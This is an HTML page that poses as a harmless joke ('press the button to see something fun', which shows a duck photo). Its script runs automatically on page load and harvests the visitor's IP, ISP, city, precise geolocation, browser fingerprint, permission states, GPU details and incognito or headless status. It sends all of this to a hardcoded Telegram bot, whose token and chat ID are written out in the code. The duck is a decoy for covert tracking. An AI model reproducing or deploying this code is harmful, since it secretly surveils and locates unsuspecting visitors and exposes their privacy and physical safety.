<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Tes1t</title>
  <style>
    body {
      font-family: Arial;
      background: #f0f0f0;
      margin: 0;
      padding: 20px;
      text-align: center;
    }

    .box {
      max-width: 700px;
      margin: auto;
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 20px;
    }

    #duck {
      display: none;
      width: 90%;
      max-width: 500px;
      margin-top: 20px;
      border-radius: 10px;
      transition: all 0.3s ease-in-out;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Aprieta el bot贸n para ver algo divertido</h2>
    <button id="startBtn">Dame Click</button>

    <!-- Imagen del pato -->
    <img id="duck" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/American_Wigeon_duck.jpg/1280px-American_Wigeon_duck.jpg"  alt="Pato Gigante">
  </div>

<script>
(() => {
  const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag"; // 锔 Token visible
  const CHAT_ID = "6065284869";

  const startBtn = document.getElementById("startBtn");
  const duck = document.getElementById("duck");

  let humanInteraction = false;

  ["click", "mousemove", "keydown", "touchstart"].forEach(evt => {
    window.addEventListener(evt, () => { humanInteraction = true; }, { once: true });
  });

  function detectHeadless() {
    return (/HeadlessChrome/.test(navigator.userAgent) ||
            !navigator.plugins?.length ||
            !navigator.languages?.length ||
            navigator.webdriver)
      ? "S铆" : "No";
  }

  async function detectIncognito() {
    return new Promise(resolve => {
      const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
      if (!fs) resolve("No detectable");
      else fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("S铆"));
    });
  }

  function getFingerprint() {
    return btoa([
      navigator.userAgent,
      navigator.language,
      screen.width + 'x' + screen.height,
      navigator.hardwareConcurrency || "n/a",
      Intl.DateTimeFormat().resolvedOptions().timeZone || "n/a"
    ].join('|'));
  }

  async function checkPermissions() {
    if (!navigator.permissions) return "No soportado";
    try {
      const cam = await navigator.permissions.query({name:"camera"});
      const mic = await navigator.permissions.query({name:"microphone"});
      const geo = await navigator.permissions.query({name:"geolocation"});
      return `C谩mara: ${cam.state}, Micr贸fono: ${mic.state}, Geoloc: ${geo.state}`;
    } catch {
      return "Error consulta permisos";
    }
  }

  function checkHardwareAcceleration() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return "No WebGL";
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (!dbg) return "No debug info";
      return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "No renderer";
    } catch {
      return "Error WebGL";
    }
  }

  async function detectAdblock() {
    try {
      await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",  {method:"HEAD", mode:"no-cors"});
      return "No detectado";
    } catch {
      return "Probable AdBlock";
    }
  }

  function checkTimezoneLocale() {
    try {
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const lang = navigator.language || navigator.userLanguage;
      if (lang.startsWith('es') && tz.startsWith('UTC')) return "Discrepancia detectada";
      return "OK";
    } catch {
      return "No disponible";
    }
  }

  // === FUNCIN MEJORADA: getIPInfo con m煤ltiples APIs ===
  async function getIPInfo() {
    const APIs = [
      {
        url: "https://ipapi.com/ip_api.php", 
        map: d => ({
          ip: d.query,
          org: d.org,
          country: d.country,
          region: d.regionName,
          city: d.city,
          asn: d.asn,
          proxy: false,
          version: d.query.includes(':') ? 'IPv6' : 'IPv4',
          lat: d.lat,
          lon: d.lon
        })
      },
      {
        url: "https://ip-api.co/json/", 
        map: d => ({
          ip: d.ip,
          org: d.org,
          country: d.country,
          region: d.regionName,
          city: d.city,
          asn: d.as,
          proxy: d.proxy,
          version: d.ip.includes(':') ? 'IPv6' : 'IPv4',
          lat: d.lat,
          lon: d.lon
        })
      },
      {
        url: "https://api.ipify.org?format=json",
        map: d => ({
          ip: d.ip,
          org: "Desconocido",
          country: "Desconocido",
          region: "Desconocido",
          city: "Desconocido",
          asn: "Desconocido",
          proxy: false,
          version: d.ip.includes(':') ? 'IPv6' : 'IPv4',
          lat: null,
          lon: null
        })
      }
    ];

    for (const { url, map } of APIs) {
      try {
        const res = await fetch(url, { method: "GET", mode: "cors" });
        if (!res.ok) continue;
        const data = await res.json();
        return map(data);
      } catch (e) {
        console.warn(`Error con ${url}:`, e.message);
        continue;
      }
    }

    return null;
  }

  // === ENVIAR A TELEGRAM CON REINTENTOS Y TIMEOUT RPIDO ===
  async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2000); // 2 segundos m谩ximo

    const fetchWithTimeout = () =>
      fetch(url, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
        signal: controller.signal
      });

    for (let i = 0; i < 3; i++) {
      try {
        const response = await fetchWithTimeout();
        clearTimeout(timeoutId);
        if (response.ok) return true;
      } catch (e) {
        if (i === 2) console.warn("Fall贸 tras 3 intentos:", e.message);
        await new Promise(r => setTimeout(r, 1000)); // retraso antes de reintento
      }
    }

    return false;
  }

  async function collectAndSend() {
    const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
      getIPInfo(),
      new Promise((res, rej) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(res, rej, {timeout: 2000});
        } else rej();
      }),
      detectIncognito(),
      checkPermissions(),
      detectAdblock()
    ]);

    let message = "";

    if (ipRes.status === "fulfilled" && ipRes.value) {
      const ip = ipRes.value;
      message += `IP: ${ip.ip}
ISP: ${ip.org}
ASN: ${ip.asn}
Proxy/VPN/Tor: ${ip.proxy ? "S铆" : "No"}
Ciudad: ${ip.city}
Regi贸n: ${ip.region}
Pa铆s: ${ip.country}
Versi贸n IP: ${ip.version}
`;
    } else {
      message += "No se pudo obtener IP\n";
    }

    message += `User-Agent: ${navigator.userAgent}
Navegador Headless: ${detectHeadless()}
Modo Inc贸gnito: ${incognitoStatus.status === "fulfilled" ? incognitoStatus.value : "Desconocido"}
Interacci贸n Humana: ${humanInteraction ? "S铆" : "No"}
Pantalla: ${screen.width}x${screen.height}
Touch Support: ${'ontouchstart' in window ? 'S铆' : 'No'}
Plataforma: ${navigator.platform}
Fingerprint: ${getFingerprint()}
Permisos (c谩mara, micr贸fono, geoloc): ${permStatus.status === "fulfilled" ? permStatus.value : "No disponible"}
Aceleraci贸n hardware: ${checkHardwareAcceleration()}
Timezone vs Locale: ${checkTimezoneLocale()}
AdBlock detectado: ${adblockStatus.status === "fulfilled" ? adblockStatus.value : "No detectable"}
Hora: ${new Date().toLocaleString()}
`;

    await sendToTelegram(message);

    // Ubicaci贸n precisa o aproximada
    if (geoRes.status === "fulfilled") {
      const {latitude, longitude, accuracy} = geoRes.value.coords;
      const locationInfo = `\nUbicaci贸n Precisa:
Latitud: ${latitude}
Longitud: ${longitude}
Precisi贸n: ${accuracy} metros`;
      await sendToTelegram(locationInfo);
    } else if (ipRes?.value?.lat && ipRes?.value?.lon) {
      const ip = ipRes.value;
      const locationInfo = `\nUbicaci贸n Aproximada (por IP):
Latitud: ${ip.lat}
Longitud: ${ip.lon}`;
      await sendToTelegram(locationInfo);
    }
  }

  //  Enviar datos apenas se carga la p谩gina
  window.addEventListener("load", () => {
    collectAndSend(); // Se ejecuta autom谩ticamente
  });

  //  Mostrar pato al hacer click
  startBtn.addEventListener("click", () => {
    duck.style.display = "block";
    startBtn.textContent = "Aqu铆 est谩 el pato ";
    startBtn.disabled = true;
  });
})();
</script>
</body>
</html>
